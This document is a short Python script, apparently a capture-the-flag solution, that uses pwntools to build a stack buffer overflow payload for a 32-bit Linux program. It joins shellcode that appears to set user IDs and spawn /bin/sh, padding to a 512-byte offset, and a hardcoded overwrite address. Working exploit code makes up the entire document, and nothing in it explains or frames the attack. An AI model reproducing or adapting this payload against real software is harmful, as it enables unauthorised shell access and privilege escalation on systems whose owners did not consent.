from pwn import *

SHELLCODE = b'\x6A\x46\x31\xDB\x80\xC7\x04\x80\xC3\xB7\x89\xD9\x58\xCD\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
WIN = 0x0804a040 # global variable (atexit)
OFFSET = 512

payload = b''
payload += SHELLCODE
payload += b'A' * (OFFSET - len(SHELLCODE))
payload += p32(WIN)

print(payload)
